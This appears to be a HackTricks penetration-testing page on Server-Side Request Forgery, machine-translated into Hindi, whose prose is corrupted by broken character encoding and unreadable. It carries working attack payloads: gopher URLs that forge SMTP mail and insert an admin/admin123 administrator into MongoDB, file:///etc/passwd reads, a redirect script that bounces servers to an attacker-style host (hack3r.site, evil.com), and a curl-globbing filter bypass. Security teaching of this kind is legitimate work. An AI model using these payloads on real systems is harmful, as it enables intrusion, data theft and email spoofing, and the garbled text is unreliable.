# SSRF (рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдлреЙрд░реНрдЬрд░реА)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рджреБрдирд┐рдпрд╛ рдХреЗ рд╕рдмрд╕реЗ рдЙрдиреНрдирдд рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдирд┐рд░реНрдорд┐рдд рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪреЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ **рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

**рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдлреЙрд░реНрдЬрд░реА (SSRF)** рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рджреБрд░реБрдкрдпреЛрдЧ рд╣реИ рдЬрдм рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ **рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рдХреЛ рдЕрдкрдиреЗ рдЪрдпрдирд┐рдд рдбреЛрдореЗрди рдкрд░ **HTTP рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реЗрд░рд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдмрд╛рд╣реНрдп рд░рд┐рдХреНрд╡реЗрд╕реНрдЯреЛрдВ рдХреЛ рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рдордиреЗ рдЦреЛрд▓ рджреЗрддрд╛ рд╣реИред

## SSRF рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░реЗрдВ

рдкрд╣рд▓реА рдЪреАрдЬ рдЬреЛ рдЖрдкрдХреЛ рдХрд░рдиреА рд╣реЛрдЧреА рд╡рд╣ рдПрдХ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЧрдпрд╛ SSRF рдЗрдВрдЯрд░реИрдХреНрд╢рди рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдирд╛ рд╣реИред HTTP рдпрд╛ DNS рдЗрдВрдЯрд░реИрдХреНрд╢рди рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* **Burp Collaborator**
* [**pingb**](http://pingb.in)
* [**canarytokens**](https://canarytokens.org/generate)
* [**interractsh**](https://github.com/projectdiscovery/interactsh)
* [**http://webhook.site**](http://webhook.site)
* [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
* [http://requestrepo.com/](http://requestrepo.com/)
* [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
* [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - ngrok рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдПрдХ Burp Collaborator

## рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯреЗрдб рдбреЛрдореЗрди рдмрд╛рдпрдкрд╛рд╕

рдЖрдо рддреМрд░ рдкрд░ рдЖрдкрдХреЛ рдкрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдХрд┐ SSRF рдХреЗрд╡рд▓ **рдирд┐рд╢реНрдЪрд┐рдд рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯреЗрдб рдбреЛрдореЗрдиреНрд╕** рдпрд╛ URL рдореЗрдВ рдХрд╛рдо рдХрд░ рд░рд╣рд╛ рд╣реИред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдкрд░ рдЖрдкрдХреЛ рдЙрд╕ рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддрдХрдиреАрдХреЛрдВ рдХрд╛ рд╕рдВрдХрд▓рди рдорд┐рд▓реЗрдЧрд╛:

{% content-ref url="url-format-bypass.md" %}
[url-format-bypass.md](url-format-bypass.md)
{% endcontent-ref %}

### рдУрдкрди рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдмрд╛рдпрдкрд╛рд╕

рдпрджрд┐ рд╕рд░реНрд╡рд░ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ рддреЛ рдЖрдк **рд╡реЗрдм рдкреЗрдЬ рдХреЗ рдЕрдВрджрд░ рдУрдкрди рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдХреЗ рд╕рднреА рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдХреНрдпреЛрдВрдХрд┐ рд╡реЗрдм рдкреЗрдЬ **SSRF рдХреЛ рдЙрд╕реА рдбреЛрдореЗрди рдХреА рдУрд░** рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░реЗрдЧрд╛**, рдЖрдк **рдУрдкрди рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдХреЗ рд╕рд░реНрд╡рд░ рдХреЛ рдЖрдВрддрд░рд┐рдХ рдХрд┐рд╕реА рднреА рд╕рдВрд╕рд╛рдзрди рддрдХ рдкрд╣реБрдВрдЪрд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдпрд╣рд╛рдБ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкрдврд╝реЗрдВ: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## рдкреНрд░реЛрдЯреЛрдХреЙрд▓

* **file://**
* URL рдпреЛрдЬрдирд╛ `file://` рдХреЛ рд╕реАрдзреЗ `/etc/passwd` рдкрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддреА рд╣реИ: `file:///etc/passwd`
* **dict://**
* DICT URL рдпреЛрдЬрдирд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ DICT рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд░рд┐рднрд╛рд╖рд╛рдПрдБ рдпрд╛ рд╢рдмреНрдж рд╕реВрдЪрд┐рдпреЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдПрдХ рдЙрджрд╛рд╣рд░рдг рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдирд┐рд░реНрдорд┐рдд URL рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬреЛ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╢рдмреНрдж, рдбреЗрдЯрд╛рдмреЗрд╕, рдФрд░ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рд╕рдВрдЦреНрдпрд╛ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ, рд╕рд╛рде рд╣реА рдПрдХ PHP рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрджрд╛рд╣рд░рдг рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ DICT рд╕рд░реНрд╡рд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
* **SFTP://**
* рд╕реБрд░рдХреНрд╖рд┐рдд рд╢реИрд▓реА рдореЗрдВ рдлрд╝рд╛рдЗрд▓ рд╕реНрдерд╛рдирд╛рдВрддрд░рдг рдХреЗ рд▓рд┐рдП рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╣рдЪрд╛рдирд╛ рдЧрдпрд╛, рдПрдХ рдЙрджрд╛рд╣рд░рдг рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ PHP рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЙрджрд╛рд╣рд░рдг рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдХреИрд╕реЗ рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА SFTP рд╕рд░реНрд╡рд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: `url=sftp://generic.com:11111/`
* **TFTP://**
* UDP рдкрд░ рд╕рдВрдЪрд╛рд▓рд┐рдд рдЯреНрд░рд┐рд╡рд┐рдпрд▓ рдлрд╝рд╛рдЗрд▓ рд╕реНрдерд╛рдирд╛рдВрддрд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓, рдПрдХ PHP рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрджрд╛рд╣рд░рдг рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ TFTP рд╕рд░реНрд╡рд░ рдХреЛ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред 'generic.com' рдкрд░ '12346' рдкреЛрд░реНрдЯ рдкрд░ 'TESTUDPPACKET' рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП рдПрдХ TFTP рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ: `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
* **LDAP://**
* рдЗрд╕ рд╕реЗрдЧрдореЗрдВрдЯ рдореЗрдВ рд▓рд╛рдЗрдЯрд╡реЗрдЯ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдПрдХреНрд╕реЗрд╕ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЖрдИрдкреА рдиреЗрдЯрд╡рд░реНрдХреНрд╕ рдкрд░ рд╡рд┐рддрд░рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рдкреНрд░рдмрдВрдзрд┐рдд рдФрд░ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд▓реЛрдХрд▓рд╣реЛрд╕реНрдЯ рдкрд░ рдПрдХ LDAP рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░реЗрдВ: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
* **SMTP**
* рдПрдХ рд╡рд┐рдзрд┐ рдХрд╛ рд╡рд░реНрдгрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ SMTP рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдЖрдВрддрд░рд┐рдХ рдбреЛрдореЗрди рдирд╛рдореЛрдВ рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрджрдо рдФрд░ рдЙрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдФрд░ рдЬрд╛рдВрдЪ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреА рдЬрд╛рддреА рд╣реИред
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
* **Curl URL globbing - WAF bypass**
* рдпрджрд┐ SSRF **curl** рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ curl рдореЗрдВ [**URL globbing**](https://everything.curl.dev/cmdline/globbing) рдирд╛рдордХ рдПрдХ рд╡рд┐рд╢реЗрд╖рддрд╛ рд╣реЛрддреА рд╣реИ рдЬреЛ WAFs рдХреЛ рджреМрдбрд╝рдиреЗ рдореЗрдВ рд╕рд╣рд╛рдпрдХ рд╣реЛ рд╕рдХрддреА рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЗрд╕ [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) рдореЗрдВ рдЖрдк `file` рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдкрде рднреНрд░рдордг** рдХреЗ рд▓рд┐рдП рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
* **рдЧреЛрдлрд░://**
* рдЧреЛрдлрд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреА рдХреНрд╖рдорддрд╛ рдХреЛ рдЪрд░реНрдЪрд╛ рдХреА рдЧрдИ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕рд░реНрд╡рд░ рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рдЖрдИрдкреА, рдкреЛрд░реНрдЯ, рдФрд░ рдмрд╛рдЗрдЯреНрд╕ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реИ, рд╕рд╛рде рд╣реА Gopherus рдФрд░ рд░рд┐рдореЛрдЯ-рдореЗрдердб-рдЧреЗрд╕рд░ рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рдкреЗрд▓реЛрдб рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рджреЛ рд╡рд┐рднрд┐рдиреНрди рдЙрдкрдпреЛрдЧреЛрдВ рдХрд╛ рдЙрджрд╛рд╣рд░рдг рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:

### рдЧреЛрдлрд░://

рдЗрд╕ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рд╕рд░реНрд╡рд░ рд╕реЗ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдИрдкреА, рдкреЛрд░реНрдЯ рдФрд░ рдмрд╛рдЗрдЯреНрд╕ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдлрд┐рд░, рдЖрдк рдореМрдЬреВрджрд╛ рдХрд┐рд╕реА рднреА TCP рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рдПрдХ SSRF рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ рдкрд╣рд▓реЗ рд╕реЗрд╡рд╛ рд╕реЗ рдмрд╛рдд рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдкрддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП)ред\
рднрд╛рдЧреНрдпрд╡рд╢, рдЖрдк [Gopherus](https://github.com/tarunkant/Gopherus) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡рд┐рднрд┐рдиреНрди рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдкреЗрд▓реЛрдб рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдПред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) рдХрд╛ рдЙрдкрдпреЛрдЧ _рдЬрд╛рд╡рд╛ RMI_ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдП _рдЧреЛрдлрд░_ рдкреЗрд▓реЛрдб рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**рдЧреЛрдлрд░ smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**рдЧреЛрдлрд░ рдПрдЪрдЯреАрдЯреАрдкреА**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**рдЧреЛрдлрд░ SMTP тАФ 1337 рдХреЛ рдмреИрдХ рдХрдиреЗрдХреНрдЯ рдХрд░реЗрдВ**

{% code title="redirect.php" %}
```php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
{% endcode %}

#### Gopher MongoDB -- рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдПрдВ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо=admin рд╣реИ, рдкрд╛рд╕рд╡рд░реНрдб=admin123 рд╣реИ рдФрд░ рдЕрдиреБрдорддрд┐=рдкреНрд░рд╢рд╛рд╕рдХ рд╣реИ
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд░реЗрдлрд░рд░ рд╣реЗрдбрд░ рдФрд░ рдЕрдиреНрдп

рд╕рд░реНрд╡рд░ рдкрд░ рдПрдирд╛рд▓рд┐рдЯрд┐рдХреНрд╕ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдЖрдо рддреМрд░ рдкрд░ рд░реЗрдлрд░рд░ рд╣реЗрдбрд░ рдХреЛ рд▓реЙрдЧ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЖрдиреЗ рд╡рд╛рд▓реЗ рд▓рд┐рдВрдХреНрд╕ рдХрд╛ рдЯреНрд░реИрдХрд┐рдВрдЧ рдХрд░ рд╕рдХреЗ, рдПрдХ рдРрд╕реА рдкреНрд░рдерд╛ рдЬреЛ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдлреЙрд░реНрдЬрд░реА (SSRF) рд╕рдВрд░рдЪрдирд╛рдУрдВ рдХреЗ рд▓рд┐рдП рд╡ exposed рдХрд░ рджреЗрддреА рд╣реИред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдРрд╕рд╛ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рд░реЗрдлрд░рд░ рд╣реЗрдбрд░ рдореЗрдВ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рдмрд╛рд╣реНрдп URL рдкрд░ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд░реЗрдлрд░рд▓ рд╕рд╛рдЗрдЯ рдХреА рд╕рд╛рдордЧреНрд░реА рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░ рд╕рдХреЗред рдЗрди рд╕рдВрд░рдЪрдирд╛рдУрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП, Burp Suite рдкреНрд▓рдЧрдЗрди "**Collaborator Everywhere**" рдХрд╛ рд╕реБрдЭрд╛рд╡ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдПрдирд╛рд▓рд┐рдЯрд┐рдХреНрд╕ рдЯреВрд▓реНрд╕ рджреНрд╡рд╛рд░рд╛ рд░реЗрдлрд░рд░ рд╣реЗрдбрд░ рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдВрднрд╛рд╡рд┐рдд SSRF рд╣рдорд▓реЗ рдХреЗ рд╕рддрд╣ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИред

## рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рд╕реЗ SNI рдбреЗрдЯрд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ SSRF

рдХрд┐рд╕реА рднреА рдмреИрдХрдПрдВрдб рд╕реЗ рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреА рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрдиреЗ рд╡рд╛рд▓реА рдПрдХ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдПрдХ рдЙрджрд╛рд╣рд░рдг Nginx рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рд╕рд╛рде рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
